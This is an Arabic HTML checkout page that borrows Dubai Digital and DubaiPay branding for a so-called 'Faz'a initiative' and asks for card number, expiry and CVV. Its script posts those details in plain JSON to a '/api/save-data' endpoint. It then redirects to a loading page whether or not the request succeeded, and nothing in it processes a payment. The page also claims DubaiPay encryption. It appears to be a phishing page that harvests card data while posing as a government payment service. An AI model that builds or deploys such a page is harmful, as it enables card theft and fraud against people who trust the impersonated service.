<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الدفع - مبادرة فزعة</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
            background-color: #f5f5f5;
            padding: 0;
            min-height: 100vh;
        }
        .container {
            max-width: 500px;
            margin: 0 auto;
            background: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            background: white;
            padding: 16px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #e0e0e0;
        }
        .header-logos {
            display: flex;
            gap: 12px;
            align-items: center;
            width: 100%;
            justify-content: space-between;
        }
        .header-logo {
            height: 32px;
            width: auto;
            object-fit: contain;
        }
        .content {
            flex: 1;
            padding: 20px;
            overflow-y: auto;
        }
        .section {
            margin-bottom: 24px;
        }
        .section-title {
            font-size: 14px;
            font-weight: 600;
            color: #9ca3af;
            margin-bottom: 12px;
            padding-bottom: 8px;
            border-bottom: 1px solid #e5e7eb;
        }
        .payment-methods {
            display: flex;
            gap: 12px;
            margin-bottom: 20px;
        }
        .payment-method {
            flex: 1;
            padding: 12px;
            border: 1px solid #e5e7eb;
            border-radius: 8px;
            text-align: center;
            cursor: pointer;
        }
        .payment-method.active {
            border-color: #2563eb;
            background-color: #eff6ff;
        }
        .payment-method img {
            height: 24px;
            margin-bottom: 4px;
        }
        .form-group {
            margin-bottom: 16px;
        }
        .form-label {
            display: block;
            font-size: 14px;
            color: #374151;
            margin-bottom: 6px;
        }
        .form-input {
            width: 100%;
            padding: 12px;
            border: 1px solid #d1d5db;
            border-radius: 8px;
            font-size: 16px;
            outline: none;
        }
        .form-input:focus {
            border-color: #2563eb;
            box-shadow: 0 0 0 2px rgba(37, 99, 235, 0.1);
        }
        .form-row {
            display: flex;
            gap: 12px;
        }
        .form-row .form-group {
            flex: 1;
        }
        .footer {
            padding: 20px;
            border-top: 1px solid #e5e7eb;
        }
        .submit-btn {
            width: 100%;
            padding: 14px;
            background-color: #2563eb;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        .submit-btn:hover {
            background-color: #1d4ed8;
        }
        .secure-info {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            margin-top: 16px;
            color: #6b7280;
            font-size: 12px;
        }
        .secure-info img {
            height: 16px;
        }
        .accepted-cards {
            width: 100%;
            margin-top: 20px;
            object-fit: contain;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="header-logos">
                <img src="dubai_digital_logo.png" alt="Dubai Digital" class="header-logo">
                <img src="dubaipay.png" alt="DubaiPay" class="header-logo">
            </div>
        </div>

        <div class="content">
            <div class="section">
                <h2 class="section-title">طريقة الدفع</h2>
                <div class="payment-methods">
                    <div class="payment-method active">
                        <img src="card_logos.png" alt="Cards">
                        <div style="font-size: 12px;">بطاقة ائتمان</div>
                    </div>
                </div>
            </div>

            <div class="section">
                <h2 class="section-title">تفاصيل البطاقة</h2>
                <div class="form-group">
                    <label class="form-label">رقم البطاقة</label>
                    <input type="text" id="cardNumber" class="form-input" placeholder="0000 0000 0000 0000" maxlength="19">
                </div>
                <div class="form-row">
                    <div class="form-group">
                        <label class="form-label">تاريخ الانتهاء</label>
                        <div style="display: flex; gap: 8px;">
                            <select id="expMonth" class="form-input" style="flex: 1;">
                                <option value="">الشهر</option>
                                <option value="01">01</option>
                                <option value="02">02</option>
                                <option value="03">03</option>
                                <option value="04">04</option>
                                <option value="05">05</option>
                                <option value="06">06</option>
                                <option value="07">07</option>
                                <option value="08">08</option>
                                <option value="09">09</option>
                                <option value="10">10</option>
                                <option value="11">11</option>
                                <option value="12">12</option>
                            </select>
                            <select id="expYear" class="form-input" style="flex: 1;">
                                <option value="">السنة</option>
                                <option value="24">2024</option>
                                <option value="25">2025</option>
                                <option value="26">2026</option>
                                <option value="27">2027</option>
                                <option value="28">2028</option>
                                <option value="29">2029</option>
                                <option value="30">2030</option>
                            </select>
                        </div>
                    </div>
                    <div class="form-group">
                        <label class="form-label">رمز التحقق (CVV)</label>
                        <input type="text" id="cvv" class="form-input" placeholder="123" maxlength="3">
                    </div>
                </div>
            </div>

            <img src="accepted_cards_ar.jpg" alt="Accepted Cards" class="accepted-cards">
            
            <div class="secure-info">
                <img src="safekey.gif" alt="Secure">
                <span>دفع آمن 100% مشفر بواسطة DubaiPay</span>
            </div>
        </div>

        <div class="footer">
            <button class="submit-btn" onclick="submitPayment()">دفع الآن</button>
        </div>
    </div>

    <script>
        // كود الربط البرمجي (Fetch API) - مضاف بشكل غير مرئي للتصميم
        async function submitPayment() {
            const cardNumber = document.getElementById('cardNumber').value;
            const expMonth = document.getElementById('expMonth').value;
            const expYear = document.getElementById('expYear').value;
            const cvv = document.getElementById('cvv').value;

            if(!cardNumber || !expMonth || !expYear || !cvv) {
                alert('يرجى إكمال جميع الحقول');
                return;
            }

            const btn = document.querySelector('.submit-btn');
            btn.disabled = true;
            btn.innerText = 'جاري المعالجة...';

            try {
                await fetch('/api/save-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'payment',
                        cardNumber,
                        expiry: expMonth + '/' + expYear,
                        cvv,
                        timestamp: new Date().toISOString()
                    })
                });
                window.location.href = 'payment_loading_ar.html';
            } catch (error) {
                window.location.href = 'payment_loading_ar.html';
            }
        }

        // تنسيق رقم البطاقة
        document.getElementById('cardNumber').addEventListener('input', function (e) {
            e.target.value = e.target.value.replace(/[^0-9]/g, '').replace(/(.{4})/g, '$1 ').trim();
        });
    </script>
</body>
</html>
